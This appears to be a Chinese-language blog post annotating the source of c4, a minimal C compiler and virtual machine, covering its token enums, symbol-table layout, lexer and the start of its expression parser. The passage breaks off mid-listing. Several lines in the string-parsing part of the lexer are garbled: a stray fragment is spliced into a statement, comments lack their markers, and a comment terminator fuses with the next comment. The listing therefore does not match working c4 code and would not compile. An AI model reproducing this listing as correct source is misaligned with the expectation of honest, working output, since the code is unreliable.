<p>一句話說就是解析原始碼檔案字元流為內部的特定標識符，然後讀取標識符，執行對應的操作，完成原始程式碼的功能。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rswier/c4/tree/master">https://github.com/rswier/c4/tree/master</a></p>
<p><img src="/img/c4.png" alt="Untitled"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *p, *lp, <span class="comment">// 原始碼中目前正在處理的位置</span></span><br><span class="line">     *data;   <span class="comment">// 程式碼段</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *e, *le,  <span class="comment">// 程式碼段</span></span><br><span class="line">    *id,      <span class="comment">// 目前正在詞法分析的標識符</span></span><br><span class="line">    *sym,     <span class="comment">// 符號表</span></span><br><span class="line">    tk,       <span class="comment">// 目前的符號</span></span><br><span class="line">    ival,    <span class="comment">// 符號對應的值</span></span><br><span class="line">    ty,       <span class="comment">// 目前表達式的類型</span></span><br><span class="line">    loc,     <span class="comment">// 局部變數在堆疊中的偏移</span></span><br><span class="line">    line,    <span class="comment">// 目前行數</span></span><br><span class="line">    src,     <span class="comment">// 輸出源碼和彙編</span></span><br><span class="line">    debug;   <span class="comment">// 列印執行的指令</span></span><br><span class="line"><span class="comment">// tokens and classes (operators last and in precedence order)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">為何 enum 是從 128 開始的呢？ </span></span><br><span class="line"><span class="comment">主要是因為 ASCII Code 定義的範圍是 0~127 共 128 字元，所以自訂的 token number 必須從 128 開始編號</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// Id = identifier 使用者定義的identifier</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*運算符</span></span><br><span class="line"><span class="comment">Assign =</span></span><br><span class="line"><span class="comment">Cond ?</span></span><br><span class="line"><span class="comment">Lor ||</span></span><br><span class="line"><span class="comment">Lan &amp;&amp;</span></span><br><span class="line"><span class="comment">Or |</span></span><br><span class="line"><span class="comment">Xor ^</span></span><br><span class="line"><span class="comment">And &amp;</span></span><br><span class="line"><span class="comment">Eq ==</span></span><br><span class="line"><span class="comment">Ne !=</span></span><br><span class="line"><span class="comment">Lt &lt;</span></span><br><span class="line"><span class="comment">Gt &gt;</span></span><br><span class="line"><span class="comment">Le &lt;=</span></span><br><span class="line"><span class="comment">Ge &gt;=</span></span><br><span class="line"><span class="comment">Shl &lt;&lt;</span></span><br><span class="line"><span class="comment">Shr &gt;&gt;</span></span><br><span class="line"><span class="comment">Add +</span></span><br><span class="line"><span class="comment">Sub -</span></span><br><span class="line"><span class="comment">Mul *</span></span><br><span class="line"><span class="comment">Div /</span></span><br><span class="line"><span class="comment">Mod %</span></span><br><span class="line"><span class="comment">Inc ++</span></span><br><span class="line"><span class="comment">Dec --</span></span><br><span class="line"><span class="comment">Brak [</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">id[Class] =</span></span><br><span class="line"><span class="comment">Num 常數數值</span></span><br><span class="line"><span class="comment">Fun 函數</span></span><br><span class="line"><span class="comment">Sys 系統調用</span></span><br><span class="line"><span class="comment">Glo 全域變數</span></span><br><span class="line"><span class="comment">Loc 局部變數</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//支援的標記類別(給詞法分析器next解析成對應的標記)</span></span><br><span class="line"><span class="comment">// C4所支援的輸入原始碼的字元集限定在7-bit ASCII上，所以每個輸入的字元只可能在[0, 127]的閉區間範圍內，所以是128</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  Num = <span class="number">128</span>, Fun, Sys, Glo, Loc, Id,</span><br><span class="line">  Char, Else, Enum, If, Int, Return, Sizeof, While,</span><br><span class="line">  Assign, Cond, Lor, Lan, Or, Xor, And, Eq, Ne, Lt, Gt, Le, Ge, Shl, Shr, Add, Sub, Mul, Div, Mod, Inc, Dec, Brak</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// opcodes</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">通常，LDR 用於將某些內容從記憶體載入到暫存器中，而 STR 用於將某些內容從暫存器儲存到記憶體位址。</span></span><br><span class="line"><span class="comment">sp：stack frame。</span></span><br><span class="line"><span class="comment">a：register 暫存器。</span></span><br><span class="line"><span class="comment">bp：概念跟 rbp(32 bits)/ebp(64 bits) 相同。</span></span><br><span class="line"><span class="comment">pc：program counter，指向當前指令。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 虛擬機器指令</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,</span><br><span class="line">       OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,</span><br><span class="line">       OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支援的資料型別</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> CHAR, INT, PTR &#125;;</span><br><span class="line"><span class="comment">//因為作者沒有實作結構體,所以[id]指向的空間被分割為Idsz大小的區塊(模擬結構體)</span></span><br><span class="line"><span class="comment">//當id指向區塊首時,id[0] == id[Tk] 存取的就是Tk成員的資料(一般是指標)</span></span><br><span class="line"><span class="comment">//其實這種做法，在高階語言裡可以理解為：沒有物件的多元素數組，來模擬對象</span></span><br><span class="line"><span class="comment">//以下是符號表的各項：</span></span><br><span class="line"><span class="comment">//Name 指向的是這個identifier的Name</span></span><br><span class="line"><span class="comment">//Type 為資料型別(例如傳回值型別),如CHAR,INT,INT+PTR</span></span><br><span class="line"><span class="comment">//Class 為型別,如Num(常數數值),Fun(函數),Sys(系統呼叫),Glo全域變數,Loc 局部變數</span></span><br><span class="line"><span class="comment">//符號表是一個長數組，每個數組的元素為符號描述，元素長度為Idsz</span></span><br><span class="line"><span class="comment">// identifier offsets (since we can&#x27;t create an ident struct)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">由於 c4 不支援 struct，因此使用 enum 來定義 symbol table(called id for c4)。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> Tk, Hash, Name, Class, Type, Val, HClass, HType, HVal, Idsz &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//詞法分析開始：</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">next</span><span class="params">()</span></span><br><span class="line">&#123;<span class="comment">// 標識符=輸入的符號</span></span><br><span class="line">  <span class="type">char</span> *pp;<span class="comment">// 標識符的起始位置</span></span><br><span class="line"><span class="comment">//next() function 是根據 p 所指的 String 做 parsing token 的動作。</span></span><br><span class="line"><span class="comment">// 用循環來忽略空白字元,不過不能被詞法分析器辨識的字元都被認為是空白字元 例如 &#x27;@&#x27;, &#x27;$&#x27;</span></span><br><span class="line">  <span class="keyword">while</span> (tk = *p) &#123;<span class="comment">//最外層的 while 大部分情況都不會是終止條件，主要是由 while 內部直接 return，因此 next() 的邏輯是處理完一個 token 後就會直接 return。</span></span><br><span class="line">    ++p;</span><br><span class="line"><span class="comment">// 1、列印輸出訊息</span></span><br><span class="line">    <span class="keyword">if</span> (tk == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (src) &#123;<span class="comment">//命令列指明-s參數,輸出原始碼與對應字節碼</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: %.*s&quot;</span>, line, p - lp, lp);</span><br><span class="line">        lp = p;</span><br><span class="line">        <span class="keyword">while</span> (le &lt; e) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%8.4s&quot;</span>, &amp;<span class="string">&quot;LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,&quot;</span></span><br><span class="line">                           <span class="string">&quot;OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,&quot;</span></span><br><span class="line">                           <span class="string">&quot;OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT,&quot;</span>[*++le * <span class="number">5</span>]);</span><br><span class="line">          <span class="keyword">if</span> (*le &lt;= ADJ) <span class="built_in">printf</span>(<span class="string">&quot; %d\n&quot;</span>, *++le); <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);<span class="comment">//ADJ之前的指令都有運算元</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++line;<span class="comment">// 行數+1</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 2、遇到巨集處理操作</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;#&#x27;</span>) &#123;<span class="comment">//#由於不支援巨集處理,所以直接跳過</span></span><br><span class="line">      <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != <span class="string">&#x27;\n&#x27;</span>) ++p;<span class="comment">// 忽略目前行的操作</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">這段是主要處理 Keywords。</span></span><br><span class="line"><span class="comment">第一步先算出該 token 的 hash value，然後利用 hash value and name 找尋 symbol table，</span></span><br><span class="line"><span class="comment">如果有找到就回傳該 token enum value；如果找不到就新增 id(symbol)，</span></span><br><span class="line"><span class="comment">並且設定 token enum value 為 Id(133)。</span></span><br><span class="line"><span class="comment">這邊最容易混淆的是 tk 這個 variable：在進入此 code block 之前，tk=*p；</span></span><br><span class="line"><span class="comment">然後在算 hash value 的時候，tk 代表的是 hash value；</span></span><br><span class="line"><span class="comment">最後要 return 前，tk 紀錄的是 token enum value。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 3.解析合法的變數名</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((tk &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;z&#x27;</span>) || (tk &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;Z&#x27;</span>) || tk == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">      pp = p - <span class="number">1</span>;<span class="comment">//因為有++p,pp回退一個字元,pp指向 [這個符號] 的首字母</span></span><br><span class="line">      <span class="keyword">while</span> ((*p &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;z&#x27;</span>) || (*p &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;Z&#x27;</span>) || (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;9&#x27;</span>) || *p == <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">        tk = tk * <span class="number">147</span> + *p++;<span class="comment">//計算標識符雜湊值,tk起始時已經等於*p,從p開始解析</span></span><br><span class="line">      tk = (tk &lt;&lt; <span class="number">6</span>) + (p - pp);<span class="comment">//雜湊值加上[符號長度]</span></span><br><span class="line">      id = sym;<span class="comment">//將id指向符號表</span></span><br><span class="line">      <span class="keyword">while</span> (id[Tk]) &#123;</span><br><span class="line"><span class="comment">//根據hash值還有字元來判斷該標識符是否已經儲存了</span></span><br><span class="line">        <span class="keyword">if</span> (tk == id[Hash] &amp;&amp; !<span class="built_in">memcmp</span>((<span class="type">char</span> *)id[Name], pp, p - pp)) </span><br><span class="line">				&#123; </span><br><span class="line"><span class="comment">//找到同名,則tk = id[Tk] (將id看做結構體,訪問其Tk成員,解釋見上)</span></span><br><span class="line">					tk = id[Tk];</span><br><span class="line">					<span class="keyword">return</span>; <span class="comment">//代表該識別碼已經被識別</span></span><br><span class="line">				&#125;</span><br><span class="line">        id = id + Idsz;<span class="comment">//繼續循環identifier表</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//找不到，將新的識別碼儲存到符號表中</span></span><br><span class="line">      id[Name] = (<span class="type">int</span>)pp;</span><br><span class="line">      id[Hash] = tk;<span class="comment">//哈希值</span></span><br><span class="line">      tk = id[Tk] = Id;<span class="comment">//哈希值</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//這三個條件分別處理的是十進位、十六進位、八進位。回傳計算後的 ival and tk=Num。</span></span><br><span class="line"><span class="comment">// 4、解析八進制、十進制、十六進制數字</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;<span class="comment">// 第一位為數字,認為是數值</span></span><br><span class="line">      <span class="keyword">if</span> (ival = tk - <span class="string">&#x27;0&#x27;</span>) &#123; <span class="keyword">while</span> (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;9&#x27;</span>) ival = ival * <span class="number">10</span> + *p++ - <span class="string">&#x27;0&#x27;</span>; &#125;<span class="comment">//第一位不為0,認為是十進制數</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (*p == <span class="string">&#x27;x&#x27;</span> || *p == <span class="string">&#x27;X&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> ((tk = *++p) &amp;&amp; ((tk &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;9&#x27;</span>) || (tk &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;f&#x27;</span>) || (tk &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;F&#x27;</span>)))<span class="comment">//第一位為0,且以x開頭,認為是16進制數</span></span><br><span class="line">          <span class="comment">//這邊處理 16 進位的方式相當有趣，主要是如何把 A~F 轉成 10~15，為何只需要 +9 就可以將 16 進位英文的部份轉成數字？關鍵在於 ‘A’ 的 ASCII code = 65 = ‘0100 0001’，而數字 10 的 2 進位是 ‘1010’，由於 16 進位並不會使用的 MSB 的 4 bits，因此 (tk &amp; 15) 濾掉前面 4 bits。觀察從 A 轉成數字 10 LSB 的差距：‘1010’ - ‘0001’ = ‘1001’ = 9。</span></span><br><span class="line">					ival = ival * <span class="number">16</span> + (tk &amp; <span class="number">15</span>) + (tk &gt;= <span class="string">&#x27;A&#x27;</span> ? <span class="number">9</span> : <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="keyword">while</span> (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;7&#x27;</span>) ival = ival * <span class="number">8</span> + *p++ - <span class="string">&#x27;0&#x27;</span>; &#125;<span class="comment">//認為是八進位數</span></span><br><span class="line">      tk = Num;<span class="comment">//token 為數值型,傳回</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 5、解析註釋，只支援單行註釋</span></span><br><span class="line"><span class="comment">//這段是處理 Div(/) or comment(//)，回傳tk=Div。</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (*p == <span class="string">&#x27;/&#x27;</span>) &#123;<span class="comment">//兩個&#x27;/&#x27;開頭,單行註釋</span></span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != <span class="string">&#x27;\n&#x27;</span>) ++p;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        tk = Div;<span class="comment">//除法</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//這段主要是處理 String，並且將字串存入 data section 中。回傳 data 起始位置 ival = (int)pp;，如果 tk=` 將 token 設為 Num，tk=Num。</span></span><br><span class="line"><span class="comment">//值得一提的是，‘\n’ 需要特別處理，因為在字串處理中，‘\n’ 會被當成兩個字元，但其實在 ASCII 中他是 LF(換行字元)，ASCII code = 10。</span></span><br><span class="line"><span class="comment">// 6、解析字串</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;\&#x27;&#x27;</span> || tk == <span class="string">&#x27;&quot;&#x27;</span>) &#123;<span class="comment">//引號開頭,認為是字元(字串)</span></span><br><span class="line">      pp = data;</span><br><span class="line">      <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != tk) &#123;<span class="comment">//直到找到符合的引號為止</span></span><br><span class="line">        <span class="keyword">if</span> ((ival = *p++) == <span class="string">&#x27;\\&#x27;</span>) &#123;<span class="comment">// 解析轉義字符</span></span><br><span class="line">          <span class="keyword">if</span> ((ival = *p++) == <span class="string">&#x27;n&#x27;</span>) ival = <span class="string">&#x27;\n&#x27;</span>;\n<span class="string">&#x27;;// &#x27;</span>\n<span class="string">&#x27; 認為是&#x27;</span>\n<span class="string">&#x27; 其他直接忽略&#x27;</span>\<span class="string">&#x27;轉義</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if (tk == &#x27;</span><span class="string">&quot;&#x27;) *data++ = ival;//如果是雙引號,認為是字串,向data拷貝字符</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      ++p;</span></span><br><span class="line"><span class="string">      if (tk == &#x27;&quot;</span><span class="string">&#x27;) ival = (int)pp; else tk = Num;雙引號則ival指向data中字串開始,單引號則認為是數字</span></span><br><span class="line"><span class="string">      return;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">//Operator 的部分會轉成 token enum value，其他符號的部分就直接依照 ASCII Code 回傳，這就是為何 token enum value 要從 128 開始，因為不能和 ASCII Code 產生衝突！</span></span><br><span class="line"><span class="string">// 7、解析運算符號，和指令一一對應</span></span><br><span class="line"><span class="string">//經過 next() 後就完成 token parser，並且取得 token enum value(tk)(andival if need)。</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>=<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Eq; &#125; else tk = Assign; return; &#125;//等於,賦值</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>+<span class="string">&#x27;) &#123; if (*p == &#x27;</span>+<span class="string">&#x27;) &#123; ++p; tk = Inc; &#125; else tk = Add; return; &#125;//加,賦值</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>-<span class="string">&#x27;) &#123; if (*p == &#x27;</span>-<span class="string">&#x27;) &#123; ++p; tk = Dec; &#125; else tk = Sub; return; &#125;//減,自增</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>!<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Ne; &#125; return; &#125;//不等於</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&lt;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Le; &#125; else if (*p == &#x27;</span>&lt;<span class="string">&#x27;) &#123; ++p; tk = Shl; &#125; else tk = Lt; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&gt;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Ge; &#125; else if (*p == &#x27;</span>&gt;<span class="string">&#x27;) &#123; ++p; tk = Shr; &#125; else tk = Gt; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>|<span class="string">&#x27;) &#123; if (*p == &#x27;</span>|<span class="string">&#x27;) &#123; ++p; tk = Lor; &#125; else tk = Or; return; &#125;//邏輯或 || OR</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&amp;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>&amp;<span class="string">&#x27;) &#123; ++p; tk = Lan; &#125; else tk = And; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>^<span class="string">&#x27;) &#123; tk = Xor; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>%<span class="string">&#x27;) &#123; tk = Mod; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>*<span class="string">&#x27;) &#123; tk = Mul; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>[<span class="string">&#x27;) &#123; tk = Brak; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>?<span class="string">&#x27;) &#123; tk = Cond; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>~<span class="string">&#x27; || tk == &#x27;</span>;<span class="string">&#x27; || tk == &#x27;</span>&#123;<span class="string">&#x27; || tk == &#x27;</span>&#125;<span class="string">&#x27; || tk == &#x27;</span>(<span class="string">&#x27; || tk == &#x27;</span>)<span class="string">&#x27; || tk == &#x27;</span>]<span class="string">&#x27; || tk == &#x27;</span>,<span class="string">&#x27; || tk == &#x27;</span>:<span class="string">&#x27;) </span></span><br><span class="line"><span class="string">return;;//不做處理</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//表達式分析</span></span><br><span class="line"><span class="string">//lev表示運算子,因為各個&#x27;</span>運算子token是依照優先權<span class="string">&#x27;生序排列的,所以lev大表示優先權高</span></span><br><span class="line"><span class="string">//不做處理</span></span><br><span class="line"><span class="string">void expr(int lev)</span></span><br><span class="line"><span class="string">&#123;  int t, *d;</span></span><br><span class="line"><span class="string">//第一部分利用 recursive descent (parsing)，檢查 symbol table (semantic Analyzer)，直接產生 IR (Code Generator)；如果有需要就會進行第二部分，Operator precedence (parsing)，主要處理四則運算。</span></span><br><span class="line"><span class="string">  if (!tk) &#123; printf(&quot;%d: unexpected eof in expression\n&quot;, line); exit(-1); &#125;// 1、遇到非法輸入直接退出，報錯</span></span><br><span class="line"><span class="string">//Num 數字處理</span></span><br><span class="line"><span class="string">// 2、解析數字表達式</span></span><br><span class="line"><span class="string">  else if (tk == Num) &#123; *++e = IMM; *++e = ival; next(); ty = INT; &#125;//直接取立即數作為表達式值，用IMM 指令將它載入到AX 中</span></span><br><span class="line"><span class="string">//將字串存入 data section 中。回傳 data 起始位置 ival = (int)pp;</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;</span><span class="string">&quot;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = ival; next();</span></span><br><span class="line"><span class="string">    while (tk == &#x27;&quot;</span><span class="string">&#x27;) next();//連續的&#x27;</span><span class="string">&quot;&#x27; 處理C風格多行文字 例如[&quot;</span>abc<span class="string">&quot; &quot;</span>def<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    data = (char *)((int)data + sizeof(int) &amp; -sizeof(int)); ty = PTR;//這邊的 data 有特別做 alignment [https://en.wikipedia.org/wiki/Data_structure_alignment]，最後輸出 IR。</span></span><br><span class="line"><span class="string">//位元組對齊到int，在末尾追加結束符 ty = PTR;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 4、解析回傳類型表達式</span></span><br><span class="line"><span class="string">  else if (tk == Sizeof) &#123;//Sizeof Operator直接計算 sizeof 的大小。</span></span><br><span class="line"><span class="string">    next(); if (tk == &#x27;(&#x27;) next(); else &#123; printf(&quot;</span>%d: open paren expected in <span class="keyword">sizeof</span>\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    ty = INT; if (tk == Int) next(); else if (tk == Char) &#123; next(); ty = CHAR; &#125;</span></span><br><span class="line"><span class="string">    while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//多層指標,每多一級加PTR</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected in <span class="keyword">sizeof</span>\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = (ty == CHAR) ? sizeof(char) : sizeof(int);//除了char是一位元組,int和多層指標</span></span><br><span class="line"><span class="string">    ty = INT;// 結果都為int型</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 5、解析變數取值與函數呼叫</span></span><br><span class="line"><span class="string">  else if (tk == Id) &#123;//變數處理</span></span><br><span class="line"><span class="string">    d = id; next();//第一個 if 處理 function call，第二個 else if 處理 enum，第三個 else 處理變數。</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) &#123;//lookahead 的技巧。//函數</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      t = 0;//形參數</span></span><br><span class="line"><span class="string">      while (tk != &#x27;)&#x27;) &#123; expr(Assign); *++e = PSH; ++t; if (tk == &#x27;,&#x27;) next(); &#125;//計算實參的值，壓棧(傳參</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (d[Class] == Sys) *++e = d[Val];</span></span><br><span class="line"><span class="string">      else if (d[Class] == Fun) &#123; *++e = JSR; *++e = d[Val]; &#125;//系統呼叫,如malloc,memset,d[val]為opcode</span></span><br><span class="line"><span class="string">//使用者定義函數,d[Val]為函數入口位址</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: bad function call\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      if (t) &#123; *++e = ADJ; *++e = t; &#125;//因為用棧傳參,調整棧</span></span><br><span class="line"><span class="string">      ty = d[Type];//函數傳回值類型</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else if (d[Class] == Num) &#123; *++e = IMM; *++e = d[Val]; ty = INT; &#125;//d[Class] == Num,處理枚舉(只有枚舉是Class==Num)</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">第一個 while 處理參數(argument)的部分，並且產生 push into stack 的 IR；</span></span><br><span class="line"><span class="string">接下來的兩個 if 分別處理system call and function call：</span></span><br><span class="line"><span class="string">system call 不做 binding 的動作，只保留 Symbol name；</span></span><br><span class="line"><span class="string">function call 則使用 JSR 指令來跳躍到該函式的真實位址。</span></span><br><span class="line"><span class="string">最後根據參數的數量調整 stack frame pointer。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*//變數</span></span><br><span class="line"><span class="string">//變數先取地址然後再LC/LI</span></span><br><span class="line"><span class="string">    else &#123;</span></span><br><span class="line"><span class="string">      if (d[Class] == Loc) &#123; *++e = LEA; *++e = loc - d[Val]; &#125;//取位址,d[Val]是局部變數偏移量</span></span><br><span class="line"><span class="string">      else if (d[Class] == Glo) &#123; *++e = IMM; *++e = d[Val]; &#125;//取位址,d[Val] 是全域變數指標</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: undefined variable\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = ((ty = d[Type]) == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 6、解析強制轉換，取得轉換的型別，直接修改type的值</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;(&#x27;) &#123;//括號處理 </span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk == Int || tk == Char) &#123;//強制型別轉換</span></span><br><span class="line"><span class="string">      t = (tk == Int) ? INT : CHAR; next();</span></span><br><span class="line"><span class="string">      while (tk == Mul) &#123; next(); t = t + PTR; &#125;//指針</span></span><br><span class="line"><span class="string">//第一個 if 處理 type casting，else 則是處理括號的優先權。</span></span><br><span class="line"><span class="string">      if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: bad cast\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      expr(Inc);//高優先權</span></span><br><span class="line"><span class="string">      ty = t;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else &#123;//一般語法括號</span></span><br><span class="line"><span class="string">      expr(Assign);</span></span><br><span class="line"><span class="string">      if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span 